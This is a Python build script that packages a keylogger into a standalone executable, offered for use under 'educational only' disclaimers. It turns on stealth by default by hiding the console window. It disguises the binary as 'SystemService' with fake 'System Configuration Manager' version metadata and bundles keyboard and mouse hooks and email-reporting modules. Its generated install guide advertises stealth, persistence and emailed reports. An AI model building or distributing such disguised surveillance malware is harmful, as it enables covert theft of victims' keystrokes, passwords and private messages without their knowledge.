#!/usr/bin/env python3
"""
Build Script for Educational Keylogger

This script creates a standalone executable from the keylogger Python scripts
using PyInstaller. The resulting executable can run without Python installation.

Educational purposes only - use responsibly and legally.
"""

import os
import sys
import subprocess
import shutil
import platform
from pathlib import Path
import json
import time


class KeyloggerBuilder:
    def __init__(self):
        self.system = platform.system()
        self.script_dir = Path(__file__).parent.absolute()
        self.project_root = self.script_dir.parent
        self.build_dir = self.script_dir / "build"
        self.dist_dir = self.script_dir / "dist"
        self.spec_file = self.script_dir / "keylogger.spec"
        
    def check_dependencies(self):
        """Check if all required dependencies are installed"""
        print("🔍 Checking dependencies...")
        
        required_packages = [
            "pyinstaller",
            "pynput", 
            "cryptography",
            "schedule",
            "psutil",
            "requests"
        ]
        
        missing_packages = []
        
        for package in required_packages:
            try:
                if package == "pyinstaller":
                    # PyInstaller is a command-line tool, check if it's available
                    try:
                        import PyInstaller.__main__
                        print(f"   ✅ {package}")
                    except ImportError:
                        raise ImportError("PyInstaller not available")
                else:
                    __import__(package.replace('-', '_'))
                    print(f"   ✅ {package}")
            except (ImportError, subprocess.CalledProcessError, FileNotFoundError):
                missing_packages.append(package)
                print(f"   ❌ {package}")
        
        if missing_packages:
            print(f"\n⚠️  Missing packages: {', '.join(missing_packages)}")
            print("Install them with: pip install -r requirements.txt")
            return False
        
        print("✅ All dependencies satisfied")
        return True
    
    def clean_build_dirs(self):
        """Clean previous build directories"""
        print("🧹 Cleaning previous build directories...")
        
        dirs_to_clean = [self.build_dir, self.dist_dir]
        
        for dir_path in dirs_to_clean:
            if dir_path.exists():
                shutil.rmtree(dir_path)
                print(f"   🗑️  Removed {dir_path}")
        
        if self.spec_file.exists():
            self.spec_file.unlink()
            print(f"   🗑️  Removed {self.spec_file}")
    
    def create_pyinstaller_spec(self):
        """Create PyInstaller spec file for customized build"""
        
        spec_content = f'''# -*- mode: python ; coding: utf-8 -*-
import platform

block_cipher = None

# Main keylogger analysis
a = Analysis(
    ['{self.project_root}/src/core/launcher.py'],
    pathex=['{self.project_root}'],
    binaries=[],
    datas=[
        ('{self.project_root}/config/config.json', 'config/'),
        ('{self.project_root}/src/core/', 'src/core/'),
        ('{self.project_root}/src/managers/', 'src/managers/'),
        ('{self.project_root}/src/utils/', 'src/utils/'),
    ],
    hiddenimports=[
        'pynput.keyboard._win32' if platform.system() == 'Windows' else 'pynput.keyboard._xorg',
        'pynput.mouse._win32' if platform.system() == 'Windows' else 'pynput.mouse._xorg',
        'cryptography.fernet',
        'schedule',
        'psutil',
        'requests',
        'smtplib',
        'email.mime.text',
        'email.mime.multipart',
        'sqlite3',
        'threading',
        'json',
        'base64',
        'gzip'
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'numpy',
        'pandas',
        'scipy',
        'PIL',
        'tkinter'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='SystemService' if platform.system() == 'Windows' else 'system-service',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console={not self.is_stealth_build},
    icon='{self.get_icon_path()}' if self.get_icon_path() else None,
    version='{self.create_version_file()}' if platform.system() == 'Windows' else None,
)
'''
        
        with open(self.spec_file, 'w') as f:
            f.write(spec_content)
        
        print(f"📄 Created PyInstaller spec: {self.spec_file}")
        return True
    
    def get_icon_path(self):
        """Get icon file path if available"""
        icon_files = ['icon.ico', 'keylogger.ico', 'system.ico']
        
        for icon_file in icon_files:
            icon_path = self.script_dir / icon_file
            if icon_path.exists():
                return str(icon_path)
        
        return None
    
    def create_version_file(self):
        """Create version file for Windows executable"""
        if self.system != "Windows":
            return None
        
        version_info = f"""# UTF-8
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0),
    prodvers=(1, 0, 0, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo([
      StringTable('040904B0', [
        StringStruct('CompanyName', 'Educational Software'),
        StringStruct('FileDescription', 'System Configuration Manager'),
        StringStruct('FileVersion', '1.0.0.0'),
        StringStruct('InternalName', 'SystemService'),
        StringStruct('LegalCopyright', 'Educational Use Only'),
        StringStruct('OriginalFilename', 'SystemService.exe'),
        StringStruct('ProductName', 'System Configuration Manager'),
        StringStruct('ProductVersion', '1.0.0.0')
      ])
    ]),
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
"""
        
        version_file = self.script_dir / "version.txt"
        with open(version_file, 'w') as f:
            f.write(version_info)
        
        return str(version_file)
    
    def build_executable(self, stealth=True, onefile=True, optimize=True):
        """Build the executable using PyInstaller"""
        print(f"🔨 Building executable...")
        print(f"   Platform: {self.system}")
        print(f"   Stealth mode: {stealth}")
        print(f"   One file: {onefile}")
        print(f"   Optimize: {optimize}")
        
        self.is_stealth_build = stealth
        
        # Create spec file
        self.create_pyinstaller_spec()
        
        # Build command - use pyinstaller directly
        # When using a .spec file, we can't use --onefile, --optimize etc.
        cmd = [
            "pyinstaller",
            "--clean",
            "--noconfirm",
            str(self.spec_file)  # Just use the spec file
        ]
        
        print(f"🚀 Running: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, cwd=self.script_dir, check=True, 
                                  capture_output=True, text=True)
            
            print("✅ Build completed successfully!")
            
            # Show build output location
            executable_name = "SystemService.exe" if self.system == "Windows" else "system-service"
            executable_path = self.dist_dir / executable_name
            
            if executable_path.exists():
                size_mb = executable_path.stat().st_size / (1024 * 1024)
                print(f"📦 Executable created: {executable_path}")
                print(f"📏 Size: {size_mb:.2f} MB")
            
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"❌ Build failed!")
            print(f"Error: {e}")
            if e.stdout:
                print(f"stdout: {e.stdout}")
            if e.stderr:
                print(f"stderr: {e.stderr}")
            return False
    
    def create_portable_package(self):
        """Create a portable package with all necessary files"""
        print("📦 Creating portable package...")
        
        package_dir = self.script_dir / "portable_keylogger"
        
        # Clean and create package directory
        if package_dir.exists():
            shutil.rmtree(package_dir)
        package_dir.mkdir()
        
        # Copy executable
        executable_name = "SystemService.exe" if self.system == "Windows" else "system-service"
        executable_path = self.dist_dir / executable_name
        
        if executable_path.exists():
            shutil.copy2(executable_path, package_dir / executable_name)
            print(f"   📋 Copied executable: {executable_name}")
        
        # Copy configuration and additional files
        files_to_copy = [
            "config.json",
            "requirements.txt",
            "README.md"
        ]
        
        for file_name in files_to_copy:
            file_path = self.script_dir / file_name
            if file_path.exists():
                shutil.copy2(file_path, package_dir / file_name)
                print(f"   📋 Copied: {file_name}")
        
        # Create batch/shell script for easy execution
        if self.system == "Windows":
            batch_content = f'''@echo off
title System Configuration Manager
echo Starting System Configuration Manager...
echo Educational Use Only - Use Responsibly
echo.
"{executable_name}"
pause
'''
            batch_file = package_dir / "start.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
            print(f"   📋 Created start script: start.bat")
        
        else:  # Linux/Unix
            shell_content = f'''#!/bin/bash
echo "Starting System Configuration Manager..."
echo "Educational Use Only - Use Responsibly"
echo ""
./{executable_name}
read -p "Press Enter to exit..."
'''
            shell_file = package_dir / "start.sh"
            with open(shell_file, 'w') as f:
                f.write(shell_content)
            shell_file.chmod(0o755)
            print(f"   📋 Created start script: start.sh")
        
        # Create installation guide
        install_guide = f'''# Keylogger Installation Guide

## Educational Use Only
This keylogger is for educational and authorized testing purposes only.

## Installation Steps

1. Extract all files to a directory of your choice
2. Run the executable:
   - Windows: Double-click `start.bat` or `{executable_name}`
   - Linux: Run `./start.sh` or `./{executable_name}`

3. Configure settings by editing `config.json`

## Important Notes

- Only use on systems you own or have explicit permission to test
- This software is for educational purposes only
- Using this on others' systems without consent is illegal
- The author is not responsible for misuse

## Configuration

Edit `config.json` to customize:
- Email reporting settings
- Stealth features
- Persistence options
- Logging preferences

## Legal Disclaimer

This keylogger is created for educational purposes and ethical testing only.
Using this software on systems without proper authorization is illegal.
The user is solely responsible for compliance with applicable laws.

Generated on: {time.strftime('%Y-%m-%d %H:%M:%S')}
Platform: {platform.system()} {platform.release()}
'''
        
        with open(package_dir / "INSTALLATION.md", 'w') as f:
            f.write(install_guide)
        
        print(f"✅ Portable package created: {package_dir}")
        return package_dir
    
    def run_tests(self):
        """Run basic tests on the built executable"""
        print("🧪 Running tests...")
        
        executable_name = "SystemService.exe" if self.system == "Windows" else "system-service"
        executable_path = self.dist_dir / executable_name
        
        if not executable_path.exists():
            print("❌ Executable not found for testing")
            return False
        
        # Test 1: Check if executable runs without errors
        try:
            print("   🔍 Test 1: Basic execution test")
            
            # Run with --help flag (if implemented)
            result = subprocess.run([str(executable_path), "--version"], 
                                  capture_output=True, text=True, timeout=10)
            
            print(f"   ✅ Executable runs (exit code: {result.returncode})")
            
        except subprocess.TimeoutExpired:
            print("   ⚠️  Executable runs but may be waiting for input")
        except Exception as e:
            print(f"   ❌ Execution test failed: {e}")
            return False
        
        # Test 2: Check file size
        try:
            size_mb = executable_path.stat().st_size / (1024 * 1024)
            print(f"   📏 File size: {size_mb:.2f} MB")
            
            if size_mb > 100:
                print("   ⚠️  Warning: Large executable size")
            elif size_mb < 5:
                print("   ⚠️  Warning: Unusually small executable")
            else:
                print("   ✅ Reasonable file size")
                
        except Exception as e:
            print(f"   ❌ Size check failed: {e}")
        
        print("✅ Tests completed")
        return True


def main():
    """Main build function"""
    print("🔨 Educational Keylogger Builder")
    print("=" * 50)
    print("⚠️  For Educational and Authorized Testing Only")
    print("=" * 50)
    
    builder = KeyloggerBuilder()
    
    # Check dependencies
    if not builder.check_dependencies():
        print("❌ Please install missing dependencies first")
        sys.exit(1)
    
    # Clean previous builds
    builder.clean_build_dirs()
    
    # Build configuration options
    build_options = {
        'stealth': True,      # Hide console window
        'onefile': True,      # Create single executable
        'optimize': True      # Optimize bytecode
    }
    
    print(f"\n🔧 Build Configuration:")
    for option, value in build_options.items():
        print(f"   {option}: {value}")
    
    # Build executable
    if builder.build_executable(**build_options):
        # Run tests
        builder.run_tests()
        
        # Create portable package
        package_dir = builder.create_portable_package()
        
        print(f"\n🎉 Build completed successfully!")
        print(f"📦 Portable package: {package_dir}")
        print(f"\n⚠️  Remember:")
        print(f"   - This is for educational purposes only")
        print(f"   - Only use on systems you own or have permission to test")
        print(f"   - Unauthorized use is illegal")
        
    else:
        print(f"\n❌ Build failed!")
        sys.exit(1)


if __name__ == "__main__":
    main()